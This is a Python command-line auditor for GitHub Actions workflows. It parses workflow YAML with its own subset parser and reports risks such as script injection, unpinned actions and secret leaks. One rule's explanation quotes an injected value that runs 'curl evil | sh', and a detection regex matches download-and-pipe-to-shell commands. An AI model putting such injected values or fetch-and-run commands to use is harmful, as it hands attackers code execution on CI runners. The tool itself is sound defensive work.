#!/usr/bin/env python3
"""ci_audit: audit GitHub Actions workflows for supply-chain and injection footguns.

Reads `.github/workflows/*.yml` with a small hand-written YAML subset parser (no PyYAML):
block mappings and sequences, plain / quoted scalars, `|` and `>` block scalars and single-line
flow collections. Anchors, aliases, tags, merge keys, multi-document files, multi-line plain or
quoted scalars and multi-line flow collections are NOT supported: a file using them is reported
as skipped (CI000) rather than guessed at. Standard library only.
"""
from __future__ import annotations

import argparse
import fnmatch
import json
import re
import sys
from collections import Counter
from pathlib import Path

RANK = {"info": 0, "low": 1, "medium": 2, "high": 3}
SEVERITIES = ("high", "medium", "low", "info")


# ================================================================ YAML subset parser

class YamlSubsetError(Exception):
    def __init__(self, line: int, reason: str):
        super().__init__(f"line {line}: {reason}")
        self.line, self.reason = line, reason


class YStr(str):
    """A scalar. `.line` is the 1-based line of its key; literal blocks also get `.body_line`."""
    line = 0
    body_line = 0
    literal = False


class YMap(dict):
    line = 0

    def __init__(self):
        super().__init__()
        self.key_lines = {}


class YSeq(list):
    line = 0

    def __init__(self):
        super().__init__()
        self.item_lines = []


def scalar(text: str, line: int) -> YStr:
    value = YStr(text)
    value.line = line
    return value


def strip_comment(text: str) -> str:
    """Remove a trailing ` # comment` that is outside quotes and `${{ }}` expressions."""
    quote, i = "", 0
    while i < len(text):
        ch = text[i]
        if quote:
            if quote == '"' and ch == "\\":
                i += 1
            elif ch == quote:
                if quote == "'" and text[i + 1:i + 2] == "'":
                    i += 1
                else:
                    quote = ""
        elif ch in "'\"" and (i == 0 or text[i - 1] in " \t[{,:-") :
            quote = ch
        elif text.startswith("${{", i):
            end = text.find("}}", i)
            i = end + 1 if end != -1 else len(text)
        elif ch == "#" and (i == 0 or text[i - 1] in " \t"):
            return text[:i].rstrip()
        i += 1
    return text.rstrip()


def unquote(text: str, line: int):
    """Parse a quoted scalar at the start of `text`; return (value, rest after the closing quote)."""
    quote = text[0]
    out, i = [], 1
    while i < len(text):
        ch = text[i]
        if quote == "'":
            if ch == "'":
                if text[i + 1:i + 2] == "'":
                    out.append("'")
                    i += 2
                    continue
                return "".join(out), text[i + 1:]
        else:
            if ch == "\\" and i + 1 < len(text):
                nxt = text[i + 1]
                out.append({"n": "\n", "t": "\t", "r": "\r", "0": "\0", '"': '"', "\\": "\\", "/": "/"}.get(nxt, "\\" + nxt))
                i += 2
                continue
            if ch == '"':
                return "".join(out), text[i + 1:]
        out.append(ch)
        i += 1
    raise YamlSubsetError(line, "multi-line quoted scalars are not supported")


def parse_flow(text: str, line: int):
    """Parse a single-line flow collection starting at text[0] ('[' or '{'). Returns (value, rest)."""
    def parse_value(s, i):
        while s[i:i + 1] == " ":
            i += 1
        ch = s[i:i + 1]
        if ch == "[":
            seq, i = YSeq(), i + 1
            seq.line = line
            while True:
                while s[i:i + 1] in (" ",):
                    i += 1
                if s[i:i + 1] == "]":
                    return seq, i + 1
                if i >= len(s):
                    raise YamlSubsetError(line, "multi-line flow collections are not supported")
                item, i = parse_value(s, i)
                seq.append(item)
                seq.item_lines.append(line)
                while s[i:i + 1] == " ":
                    i += 1
                if s[i:i + 1] == ",":
                    i += 1
                elif s[i:i + 1] != "]":
                    raise YamlSubsetError(line, "malformed flow sequence")
        if ch == "{":
            mapping, i = YMap(), i + 1
            mapping.line = line
            while True:
                while s[i:i + 1] == " ":
                    i += 1
                if s[i:i + 1] == "}":
                    return mapping, i + 1
                if i >= len(s):
                    raise YamlSubsetError(line, "multi-line flow collections are not supported")
                key, i = parse_value(s, i)
                while s[i:i + 1] == " ":
                    i += 1
                if s[i:i + 1] != ":":
                    raise YamlSubsetError(line, "malformed flow mapping")
                i += 1
                val, i = parse_value(s, i)
                mapping[str(key)] = val
                mapping.key_lines[str(key)] = line
                while s[i:i + 1] == " ":
                    i += 1
                if s[i:i + 1] == ",":
                    i += 1
                elif s[i:i + 1] != "}":
                    raise YamlSubsetError(line, "malformed flow mapping")
        if ch in "'\"":
            value, rest = unquote(s[i:], line)
            return scalar(value, line), len(s) - len(rest)
        if ch in "&*!":
            raise YamlSubsetError(line, "anchors, aliases and tags are not supported")
        start = i
        while i < len(s):
            if s.startswith("${{", i):
                end = s.find("}}", i)
                if end == -1:
                    raise YamlSubsetError(line, "unterminated ${{ expression")
                i = end + 2
                continue
            if s[i] in ",]}" or (s[i] == ":" and s[i + 1:i + 2] in (" ", "")):
                break
            i += 1
        if i >= len(s) and start == i:
            raise YamlSubsetError(line, "multi-line flow collections are not supported")
        return scalar(s[start:i].strip(), line), i

    value, end = parse_value(text, 0)
    return value, text[end:].strip()


KEY_RE = re.compile(r"^(.*?):(?:\s+(.*)|)$")


class Parser:
    def __init__(self, text: str):
        text = text.lstrip("﻿").replace("\r\n", "\n")
        self.raw = text.split("\n")
        self.n = len(self.raw)

    # -- line helpers
    def indent(self, i: int) -> int:
        line = self.raw[i]
        count = len(line) - len(line.lstrip(" "))
        if line[count:count + 1] == "\t":
            raise YamlSubsetError(i + 1, "tab used for indentation")
        return count

    def sig(self, i: int) -> int:
        while i < self.n:
            stripped = self.raw[i].strip()
            if stripped and not stripped.startswith("#"):
                if stripped == "..." :
                    return self.n
                return i
            i += 1
        return self.n

    def content(self, i: int) -> str:
        return strip_comment(self.raw[i][self.indent(i):])

    # -- structure
    def parse(self):
        i = self.sig(0)
        if i < self.n and self.raw[i].strip().startswith("---"):
            rest = self.raw[i].strip()[3:].strip()
            if rest:
                raise YamlSubsetError(i + 1, "content after --- is not supported")
            i = self.sig(i + 1)
        if i >= self.n:
            return YMap()
        node, i = self.block(i, self.indent(i))
        i = self.sig(i)
        if i < self.n:
            if self.raw[i].strip().startswith("---"):
                raise YamlSubsetError(i + 1, "multi-document files are not supported")
            raise YamlSubsetError(i + 1, "unexpected content (check indentation)")
        return node

    def block(self, i: int, ind: int):
        text = self.content(i)
        if text.startswith("- ") or text == "-":
            return self.seq(i, ind)
        return self.map(i, ind)

    def split_key(self, text: str, line: int):
        if not text:
            raise YamlSubsetError(line, "empty line where a key was expected")
        if text[0] in "'\"":
            key, rest = unquote(text, line)
            rest = rest.lstrip()
            if not rest.startswith(":"):
                raise YamlSubsetError(line, "expected 'key: value'")
            rest = rest[1:]
            if rest and not rest.startswith(" "):
                raise YamlSubsetError(line, "expected a space after ':'")
            return key, rest.strip()
        if text[0] in "&*!?" or text.startswith("<<"):
            raise YamlSubsetError(line, "anchors, aliases, tags, merge keys and complex keys are not supported")
        match = KEY_RE.match(text)
        if not match:
            raise YamlSubsetError(line, "expected 'key: value'")
        return match.group(1).strip(), (match.group(2) or "").strip()

    def is_key_line(self, text: str, line: int) -> bool:
        try:
            self.split_key(text, line)
            return True
        except YamlSubsetError:
            return False

    def map(self, i: int, ind: int):
        result = YMap()
        result.line = i + 1
        while True:
            i = self.sig(i)
            if i >= self.n:
                break
            current = self.indent(i)
            if current < ind:
                break
            if current > ind:
                raise YamlSubsetError(i + 1, "unexpected indentation")
            text = self.content(i)
            if text.startswith("- ") or text == "-":
                break
            if self.raw[i].startswith("---"):
                break
            key, rest = self.split_key(text, i + 1)
            if key in result:
                raise YamlSubsetError(i + 1, f"duplicate key '{key}'")
            value, i = self.value(rest, i, ind)
            if isinstance(value, YStr) and not value.line:
                value.line = result.line
            result[key] = value
            result.key_lines[key] = self.key_line_of(value, i)
        return result, i

    def key_line_of(self, value, _i):
        return getattr(value, "key_line", 0)

    def value(self, rest: str, i: int, ind: int, in_seq: bool = False):
        """Parse the value that follows `key:` (or `- `) on line i. Returns (value, next_index)."""
        line_no = i + 1
        if rest == "":
            j = self.sig(i + 1)
            if j < self.n:
                next_indent, next_text = self.indent(j), self.content(j)
                is_dash = next_text == "-" or next_text.startswith("- ")
                if next_indent > ind or (not in_seq and next_indent == ind and is_dash):
                    node, k = self.block(j, next_indent)
                    self.tag_line(node, line_no)
                    return node, k
            empty = scalar("", line_no)
            self.tag_line(empty, line_no)
            return empty, i + 1
        if rest[0] in "|>":
            return self.block_scalar(rest, i, ind, line_no)
        if rest[0] in "[{":
            node, tail = parse_flow(rest, line_no)
            if tail:
                raise YamlSubsetError(line_no, "unexpected text after a flow collection")
            self.tag_line(node, line_no)
            return node, i + 1
        if rest[0] in "&*!":
            raise YamlSubsetError(line_no, "anchors, aliases and tags are not supported")
        if rest[0] in "'\"":
            text, tail = unquote(rest, line_no)
            if tail.strip():
                raise YamlSubsetError(line_no, "unexpected text after a quoted scalar")
            value = scalar(text, line_no)
            self.tag_line(value, line_no)
            self.check_no_continuation(i, ind)
            return value, i + 1
        value = scalar(rest, line_no)
        self.tag_line(value, line_no)
        self.check_no_continuation(i, ind)
        return value, i + 1

    @staticmethod
    def tag_line(node, line_no):
        node.key_line = line_no

    def check_no_continuation(self, i: int, ind: int):
        j = self.sig(i + 1)
        if j < self.n and self.indent(j) > ind:
            raise YamlSubsetError(j + 1, "multi-line plain or quoted scalars are not supported")

    def block_scalar(self, header: str, i: int, ind: int, line_no: int):
        match = re.match(r"^([|>])([+-]?)(\d?)([+-]?)\s*$", header)
        if not match:
            raise YamlSubsetError(line_no, "malformed block scalar header")
        style, chomp = match.group(1), match.group(2) or match.group(4)
        lines, j, block_indent = [], i + 1, None
        while j < self.n:
            raw = self.raw[j]
            if not raw.strip():
                lines.append("")
                j += 1
                continue
            current = len(raw) - len(raw.lstrip(" "))
            if block_indent is None:
                if current <= ind:
                    break
                block_indent = current
            if current < block_indent:
                break
            lines.append(raw[block_indent:])
            j += 1
        consumed = j
        while lines and lines[-1] == "" and chomp != "+":
            lines.pop()
        # give trailing blank lines back to the structure when they were not content
        if style == "|":
            text = "\n".join(lines)
        else:
            text = self.fold(lines)
        if lines and chomp != "-":
            text += "\n"
        value = scalar(text, line_no)
        value.key_line = line_no
        value.body_line = line_no + 1
        value.literal = style == "|"
        return value, consumed

    @staticmethod
    def fold(lines: list) -> str:
        out, previous_text = "", False
        for line in lines:
            if line == "":
                out += "\n"
                previous_text = False
            elif line.startswith(" "):
                out += ("\n" if out and not out.endswith("\n") else "") + line + "\n"
                previous_text = False
            else:
                out += (" " if previous_text else "") + line
                previous_text = True
        return out

    def seq(self, i: int, ind: int):
        result = YSeq()
        result.line = i + 1
        while True:
            i = self.sig(i)
            if i >= self.n:
                break
            current = self.indent(i)
            if current < ind:
                break
            if current > ind:
                raise YamlSubsetError(i + 1, "unexpected indentation")
            text = self.content(i)
            if not (text.startswith("- ") or text == "-"):
                break
            rest = text[1:].lstrip()
            column = ind + (len(text) - len(rest))
            line_no = i + 1
            if rest.startswith("- ") or rest == "-":
                raise YamlSubsetError(line_no, "nested sequences on one line are not supported")
            if rest and rest[0] not in "|>[{&*!'\"" and self.is_key_line(rest, line_no):
                self.raw[i] = " " * column + rest
                item, i = self.map(i, column)
            elif rest and rest[0] in "'\"" and self.is_key_line(rest, line_no):
                self.raw[i] = " " * column + rest
                item, i = self.map(i, column)
            else:
                item, i = self.value(rest, i, ind, in_seq=True)
            result.append(item)
            result.item_lines.append(line_no)
        return result, i


def parse_yaml(text: str):
    return Parser(text).parse()


def line_of(mapping, key, default=0) -> int:
    if isinstance(mapping, YMap):
        return mapping.key_lines.get(key) or mapping.line or default
    return default


# ================================================================ audit rules

# ---------------------------------------------------------------- .shipcheck-ignore

def load_ignore(root: Path) -> list:
    """Path globs from `.shipcheck-ignore` (fingerprint and rule lines belong to secrets_scan.py)."""
    path = Path(root) / ".shipcheck-ignore"
    if not path.is_file():
        return []
    globs = []
    for raw in path.read_text(encoding="utf-8", errors="replace").replace("\r\n", "\n").split("\n"):
        line = raw.strip()
        if line and not line.startswith(("#", "fp:", "rule:")) and not re.fullmatch(r"[0-9a-f]{12}", line):
            globs.append(line)
    return globs


def path_ignored(rel: str, globs) -> bool:
    name = rel.rsplit("/", 1)[-1]
    for glob in globs:
        if glob.endswith("/") and (rel + "/").startswith(glob.lstrip("/")):
            return True
        if fnmatch.fnmatch(rel, glob.lstrip("/")) or ("/" not in glob and fnmatch.fnmatch(name, glob)):
            return True
    return False


RULES = {
    "CI000": ("not-audited", "info",
              "A file this tool cannot parse is not being checked at all.",
              "Simplify the YAML (no anchors, aliases, tags or multi-line scalars) or review the file by hand."),
    "CI001": ("action-not-pinned", "medium",
              "A tag or branch can be moved by whoever controls the action's repository, so a compromised action runs its new code in your job with your secrets.",
              "Pin to the full 40-character commit SHA and keep the version in a comment: uses: owner/repo@<sha>  # v4.1.0"),
    "CI002": ("pull-request-target-checkout", "high",
              "pull_request_target runs with the base repository's secrets and a write token. Checking out the pull request head and running its code lets any fork author execute code with those secrets.",
              "Use pull_request for untrusted code. If you need pull_request_target, never check out or run the head; label-gate it and treat the PR as data only."),
    "CI003": ("permissions-too-broad", "medium",
              "Without a permissions block the GITHUB_TOKEN gets the repository default, which is often read and write on everything. A compromised step then pushes code or edits releases.",
              "Add `permissions: contents: read` at the top and grant extra scopes per job only where needed."),
    "CI004": ("script-injection", "high",
              "${{ }} is pasted into the script text before the shell runs. A pull request title, branch name or comment such as `a\"; curl evil | sh; \"` becomes shell code in your runner.",
              "Pass the value through env and quote it in the script: env: TITLE: ${{ github.event.pull_request.title }} then \"$TITLE\"."),
    "CI005": ("secret-exposure", "medium",
              "Secrets interpolated into a command line show up in the process list and are printed by echo or set -x; GitHub's masking misses transformed values such as base64.",
              "Pass the secret as an environment variable (env: TOKEN: ${{ secrets.TOKEN }}) or to the action's with: input, and never echo it."),
    "CI006": ("pipe-to-shell", "medium",
              "The script is fetched and executed in one step, so a changed or hijacked URL runs attacker code in your job.",
              "Download to a file, verify a checksum or signature, then run it; or use a pinned action or package."),
    "CI007": ("no-timeout", "low",
              "A hung job runs for 6 hours by default, burning minutes and holding runners and locks.",
              "Add `timeout-minutes:` to the job, a bit above its normal duration."),
    "CI008": ("no-dependency-cache", "low",
              "Every run downloads and installs all dependencies again: slower builds, and more exposure to registry outages and fresh malicious releases.",
              "Use the setup action's built-in cache (cache: npm / pip / gradle ...) or actions/cache keyed on the lockfile."),
    "CI009": ("continue-on-error-test", "medium",
              "A failing test no longer fails the workflow, so broken code merges and deploys with a green check.",
              "Remove continue-on-error from test and lint steps, or quarantine the flaky test properly."),
    "CI010": ("self-hosted-on-fork-trigger", "high",
              "A self-hosted runner executes code from pull requests. In a public repository any fork can run code on your machine and your network.",
              "Use GitHub-hosted runners for pull_request triggers, or restrict runs to trusted contributors with required approval and ephemeral runners."),
    "CI011": ("deploy-without-concurrency", "medium",
              "Two pushes close together start two deploys that race; the older one can finish last and ship the older code.",
              "Add `concurrency: { group: deploy-${{ github.ref }}, cancel-in-progress: false }` to the deploy workflow or job."),
}

SHA = re.compile(r"^[0-9a-f]{40}$")
VERSIONISH = re.compile(r"^v?\d+(?:[.\d]*)(?:[-+.\w]*)$")
BRANCHES = {"main", "master", "develop", "dev", "trunk", "head", "latest", "stable", "release"}
EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
UNTRUSTED = re.compile(
    r"\bgithub\.head_ref\b|\bgithub\.event\.(?:"
    r"issue\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label|repo\.default_branch))|"
    r"comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|"
    r"pages(?:\[[^\]]*\]|\.\*)?\.page_name|commits(?:\[[^\]]*\]|\.\*)?\.(?:message|author\.(?:email|name))|"
    r"head_commit\.(?:message|author\.(?:email|name))|"
    r"workflow_run\.(?:head_branch|head_commit\.(?:message|author\.(?:email|name))|pull_requests[\w\[\]*.]*\.head\.ref)|"
    r"release\.(?:name|body)|client_payload\b[\w.]*)")
INPUTS = re.compile(r"\bgithub\.event\.inputs\.[\w-]+|\binputs\.[\w-]+")
FORK_TRIGGERS = {"pull_request", "pull_request_target", "issue_comment", "pull_request_review",
                 "pull_request_review_comment"}
PIPE_SHELL = re.compile(
    r"(?:curl|wget)\b[^|;&\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+\S+=\S+\s+)?"
    r"(?:bash|sh|zsh|ash|dash|python[\d.]*|perl|ruby|node)\b"
    r"|\b(?:bash|sh)\s+(?:-c\s+)?[\"']?\$\(\s*(?:curl|wget)\b|<\(\s*(?:curl|wget)\b")
INSTALL = re.compile(
    r"\b(?:npm\s+(?:ci|install|i)\b|yarn(?:\s+install)?\s*(?:$|&&|;)|pnpm\s+(?:install|i)\b|pip3?\s+install\b|"
    r"python3?\s+-m\s+pip\s+install\b|poetry\s+install\b|pipenv\s+install\b|bundle\s+install\b|composer\s+install\b|"
    r"go\s+mod\s+download\b|cargo\s+(?:build|fetch)\b|mvn\b|gradle\w*\b|uv\s+(?:sync|pip)\b|dotnet\s+restore\b)")
TESTISH = re.compile(r"(?i)\b(?:tests?|pytest|jest|vitest|mocha|rspec|phpunit|unittest|tox|nox|lint|eslint|mypy|ruff|check|e2e|cypress|playwright)\b")
DEPLOYISH = re.compile(r"(?i)\b(?:deploy\w*|publish\w*|production|prod)\b")
DEPLOY_CMD = re.compile(
    r"\b(?:kubectl\s+(?:apply|rollout)|terraform\s+apply|helm\s+(?:upgrade|install)|firebase\s+deploy|"
    r"vercel\s+(?:deploy|--prod)|netlify\s+deploy|aws\s+s3\s+sync|aws\s+ecs\s+update-service|gcloud\s+\S+\s+deploy|"
    r"npm\s+publish|twine\s+upload|cdk\s+deploy|serverless\s+deploy|fly\s+deploy|az\s+webapp\s+deploy)\b")


def mask(value: str) -> str:
    value = value.strip()
    return value[:4] + "****" + value[-2:] if len(value) >= 12 else "****"


def is_true(node) -> bool:
    return isinstance(node, str) and node.strip().lower() == "true"


def triggers_of(workflow) -> set:
    node = workflow.get("on")
    if node is None:
        node = workflow.get("true")
    if isinstance(node, YMap):
        return set(node)
    if isinstance(node, YSeq):
        return {str(x) for x in node}
    if isinstance(node, str) and node:
        return {str(node)}
    return set()


def script_lines(node, key_line: int):
    """Yield (line_number, text) for each line of a run script or github-script body."""
    text = str(node)
    base = node.body_line if getattr(node, "literal", False) and node.body_line else None
    for offset, line in enumerate(text.split("\n")):
        yield (base + offset if base else key_line), line


def audit_workflow(rel: str, workflow) -> list:
    findings = []

    def add(rule, line, message, severity=None):
        name, default, why, fix = RULES[rule]
        findings.append({"file": rel, "line": line, "rule": rule, "name": name,
                         "severity": severity or default, "message": message, "why": why, "fix": fix})

    if not isinstance(workflow, YMap):
        add("CI000", 1, "not a workflow mapping; skipped")
        return findings
    jobs = workflow.get("jobs")
    if not isinstance(jobs, YMap) or not jobs:
        add("CI000", workflow.line or 1, "no jobs: mapping found; nothing to audit")
        return findings
    triggers = triggers_of(workflow)
    base = Path(rel).name.lower()
    jobs_line = line_of(workflow, "jobs", 1)

    # --- permissions
    top_permissions = workflow.get("permissions")
    for owner, label in [(workflow, "workflow")] + [(j, f"job {jid}") for jid, j in jobs.items() if isinstance(j, YMap)]:
        node = owner.get("permissions")
        if isinstance(node, str) and node.strip() == "write-all":
            add("CI003", line_of(owner, "permissions"), f"{label}: permissions: write-all", "high")
    if top_permissions is None:
        bare = [jid for jid, j in jobs.items() if isinstance(j, YMap) and "permissions" not in j and "uses" not in j]
        if bare:
            add("CI003", jobs_line, "no permissions: block at workflow level, and job(s) without one: " + ", ".join(bare[:5]))

    # --- workflow-level env that comes from secrets
    secret_env_workflow = _secret_env(workflow.get("env"))

    deploy_jobs, deploy_without_concurrency = [], []
    for job_id, job in jobs.items():
        if not isinstance(job, YMap):
            continue
        job_line = line_of(jobs, job_id)
        is_reusable = "uses" in job
        if is_reusable:
            _check_uses(add, str(job["uses"]), line_of(job, "uses"))
        # self-hosted runner on fork-reachable triggers
        runs_on = job.get("runs-on")
        if runs_on is not None and triggers & FORK_TRIGGERS and _is_self_hosted(runs_on):
            add("CI010", line_of(job, "runs-on"),
                f"job {job_id} runs on a self-hosted runner and the workflow triggers on "
                + ", ".join(sorted(triggers & FORK_TRIGGERS)))
        steps = job.get("steps")
        steps = steps if isinstance(steps, YSeq) else YSeq()
        if not is_reusable and "timeout-minutes" not in job:
            add("CI007", job_line, f"job {job_id} has no timeout-minutes (default is 360)")
        if is_true(job.get("continue-on-error")) and TESTISH.search(f"{job_id} {job.get('name', '')}"):
            add("CI009", line_of(job, "continue-on-error"), f"job {job_id} sets continue-on-error: true")
        secret_env = dict(secret_env_workflow)
        secret_env.update(_secret_env(job.get("env")))

        cached = any(_step_caches(s) for s in steps if isinstance(s, YMap))
        first_install = None
        deployish = bool(DEPLOYISH.search(f"{job_id} {job.get('name', '')}"))
        for index, step in enumerate(steps):
            if not isinstance(step, YMap):
                continue
            step_line = steps.item_lines[index] if index < len(steps.item_lines) else step.line
            uses = step.get("uses")
            step_env = dict(secret_env)
            step_env.update(_secret_env(step.get("env")))
            if uses:
                _check_uses(add, str(uses), line_of(step, "uses", step_line))
                if str(uses).startswith("actions/checkout") and "pull_request_target" in triggers:
                    _check_checkout(add, step, step_line)
                if str(uses).startswith("actions/github-script"):
                    with_ = step.get("with")
                    if isinstance(with_, YMap) and "script" in with_:
                        _check_injection(add, with_["script"], line_of(with_, "script"))
            run = step.get("run")
            if run is not None:
                key_line = line_of(step, "run", step_line)
                _check_injection(add, run, key_line)
                _check_run_secrets(add, run, key_line, step_env)
                for number, text in script_lines(run, key_line):
                    if PIPE_SHELL.search(text):
                        add("CI006", number, "downloads a script and pipes it into a shell")
                if "pull_request_target" in triggers and re.search(
                        r"(?:checkout|fetch|pr\s+checkout|git\s+(?:merge|pull))[^\n]*(?:github\.event\.pull_request\.head|github\.head_ref|refs/pull/)", str(run)):
                    add("CI002", key_line, "a run step checks out the pull request head under pull_request_target")
                if INSTALL.search(str(run)) and first_install is None:
                    first_install = key_line
                if DEPLOY_CMD.search(str(run)):
                    deployish = True
            if is_true(step.get("continue-on-error")):
                label = f"{step.get('name', '')} {run if run is not None else ''} {uses or ''}"
                if TESTISH.search(label):
                    add("CI009", line_of(step, "continue-on-error"),
                        f"step {str(step.get('name') or run or uses).strip().splitlines()[0][:50]!r} sets continue-on-error: true")
        if first_install is not None and not cached:
            add("CI008", first_install, f"job {job_id} installs dependencies without a cache")
        if deployish:
            deploy_jobs.append(job_id)
            if "concurrency" not in job:
                deploy_without_concurrency.append(job_id)
    # --- deploy workflows need concurrency
    workflow_deployish = bool(DEPLOYISH.search(f"{workflow.get('name', '')} {base}"))
    if "concurrency" not in workflow:
        if workflow_deployish:
            targets = [j for j in jobs if isinstance(jobs[j], YMap) and "concurrency" not in jobs[j]]
        else:
            targets = deploy_without_concurrency
        if targets:
            add("CI011", jobs_line, "deploy workflow has no concurrency: group (job(s): " + ", ".join(targets[:5]) + ")")
    return findings


def _secret_env(node) -> dict:
    names = {}
    if isinstance(node, YMap):
        for key, value in node.items():
            if isinstance(value, str) and "secrets." in value:
                names[key] = True
    return names


def _is_self_hosted(node) -> bool:
    if isinstance(node, YMap):
        return "group" in node or any(_is_self_hosted(v) for v in node.values())
    if isinstance(node, YSeq):
        return any(_is_self_hosted(v) for v in node)
    return "self-hosted" in str(node).lower()


def _check_uses(add, uses: str, line: int):
    uses = uses.strip()
    if uses.startswith("./"):
        return
    if uses.startswith("docker://"):
        if "@sha256:" not in uses:
            add("CI001", line, f"uses: {uses} is not pinned to an image digest", "low")
        return
    if "@" not in uses:
        add("CI001", line, f"uses: {uses} has no ref at all", "high")
        return
    target, _, ref = uses.rpartition("@")
    ref = ref.strip()
    if SHA.match(ref):
        return
    owner = target.split("/")[0].lower()
    first_party = owner in ("actions", "github")
    branch = ref.lower() in BRANCHES or not VERSIONISH.match(ref)
    if first_party:
        severity = "medium" if branch else "low"
    else:
        severity = "high" if branch else "medium"
    kind = "a branch" if branch else "a tag"
    who = "first-party" if first_party else "third-party"
    add("CI001", line, f"uses: {target}@{ref} ({who}) is pinned to {kind}, not a commit SHA", severity)


def _check_checkout(add, step, step_line):
    with_ = step.get("with")
    if not isinstance(with_, YMap):
        return
    for key in ("ref", "repository"):
        value = with_.get(key)
        if value and re.search(r"github\.event\.pull_request\.head|github\.head_ref|refs/pull/|github\.event\.workflow_run\.head", str(value)):
            add("CI002", line_of(with_, key, step_line),
                f"actions/checkout with {key}: {str(value).strip()} under pull_request_target")


def _check_injection(add, node, key_line):
    for number, text in script_lines(node, key_line):
        for match in EXPRESSION.finditer(text):
            expr = match.group(1).strip()
            if UNTRUSTED.search(expr):
                add("CI004", number, "untrusted value interpolated into a script: ${{ " + expr + " }}")
            elif INPUTS.search(expr):
                add("CI004", number, "workflow input interpolated into a script: ${{ " + expr + " }}", "medium")


def _check_run_secrets(add, node, key_line, secret_env):
    text = str(node)
    if "--password-stdin" in text or "--with-token" in text:
        return
    for number, line in script_lines(node, key_line):
        echo = re.search(r"\b(?:echo|printf)\b", line) is not None
        if "secrets." in line and "${{" in line:
            if echo:
                add("CI005", number, "secret printed with echo/printf: " + _expr(line), "high")
            else:
                add("CI005", number, "secret interpolated into the script text: " + _expr(line))
        elif echo:
            for name in secret_env:
                if re.search(r"\$\{?" + re.escape(name) + r"\b", line):
                    add("CI005", number, f"secret environment variable ${name} is printed", "high")


def _expr(line: str) -> str:
    match = re.search(r"\$\{\{\s*(secrets\.[\w-]+)\s*\}\}", line)
    return "${{ " + match.group(1) + " }}" if match else "${{ secrets.* }}"


def _step_caches(step) -> bool:
    uses = str(step.get("uses") or "")
    if not uses:
        return False
    if uses.startswith("actions/cache") or "cache" in uses.lower().split("@")[0]:
        return True
    with_ = step.get("with")
    if isinstance(with_, YMap) and any(k in with_ for k in ("cache", "bundler-cache", "enable-cache", "cache-dependency-path")):
        return True
    if uses.startswith("actions/setup-go@"):
        ref = uses.split("@", 1)[1]
        return bool(SHA.match(ref)) or re.match(r"v([4-9]|\d{2})", ref) is not None
    return False


# ================================================================ files and output

def find_workflows(path: Path) -> list:
    if path.is_file():
        return [path]
    folder = path / ".github" / "workflows"
    if not folder.is_dir():
        if path.name != "workflows":
            return []
        folder = path
    globs = load_ignore(path)
    return sorted(p for p in folder.iterdir() if p.is_file() and p.suffix.lower() in (".yml", ".yaml")
                  and not path_ignored(p.relative_to(path).as_posix() if path.is_dir() and p.is_relative_to(path) else p.name, globs))


def audit_files(paths: list) -> dict:
    findings, files, skipped = [], [], []
    for given in paths:
        given = Path(given)
        for found in find_workflows(given):
            rel = found.relative_to(given).as_posix() if given.is_dir() and found.is_relative_to(given) else found.as_posix()
            files.append(rel)
            try:
                text = found.read_bytes().decode("utf-8-sig", "replace")
                workflow = parse_yaml(text)
            except YamlSubsetError as exc:
                skipped.append({"file": rel, "line": exc.line, "reason": exc.reason})
                name, severity, why, fix = RULES["CI000"]
                findings.append({"file": rel, "line": exc.line, "rule": "CI000", "name": name, "severity": severity,
                                 "message": f"not audited, YAML subset parser stopped: {exc.reason}", "why": why, "fix": fix})
                continue
            findings.extend(audit_workflow(rel, workflow))
    findings.sort(key=lambda f: (f["file"], f["line"], f["rule"], f["message"]))
    counts = Counter(f["severity"] for f in findings)
    return {"tool": "ci_audit", "workflows": sorted(files), "skipped": skipped,
            "counts": {s: counts.get(s, 0) for s in SEVERITIES}, "findings": findings}


def format_text(result: dict, explain: bool = False) -> str:
    c = result["counts"]
    n = len(result["workflows"])
    lines = [f"shipcheck ci: {n} workflow{'s' if n != 1 else ''}, {len(result['findings'])} findings "
             f"({c['high']} high, {c['medium']} medium, {c['low']} low, {c['info']} info)"]
    for f in result["findings"]:
        lines.append(f"{f['file']}:{f['line']}  {f['rule']}  {f['severity']:<6}  {f['message']}")
        if explain:
            lines.append(f"    why: {f['why']}")
        lines.append(f"    fix: {f['fix']}")
    if result["skipped"]:
        lines.append(f"skipped {len(result['skipped'])} file(s) the YAML subset parser could not read; they were NOT audited")
    return "\n".join(lines)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(prog="ci_audit.py", description="Audit GitHub Actions workflows.")
    parser.add_argument("path", nargs="*", default=["."], help="project folder, workflows folder or workflow file(s) (default: .)")
    parser.add_argument("--json", action="store_true", help="print JSON instead of text")
    parser.add_argument("--fail-on", default="high", choices=["high", "medium", "low", "info", "never"],
                        help="exit 1 when a finding at or above this severity exists (default: high)")
    parser.add_argument("--explain", action="store_true", help="add a `why:` line (the attack) to each finding")
    parser.add_argument("--list-rules", action="store_true", help="print rule ids and exit")
    args = parser.parse_args(argv)
    if args.list_rules:
        for rule, (name, severity, _why, _fix) in sorted(RULES.items()):
            print(f"{rule}  {severity:<6}  {name}")
        return 0
    missing = [p for p in args.path if not Path(p).exists()]
    if missing:
        print(f"error: {missing[0]} does not exist", file=sys.stderr)
        return 2
    result = audit_files(args.path)
    if args.json:
        print(json.dumps(result, indent=2, sort_keys=True))
    else:
        print(format_text(result, args.explain))
    if args.fail_on != "never":
        limit = RANK[args.fail_on]
        if any(RANK[f["severity"]] >= limit for f in result["findings"]):
            return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
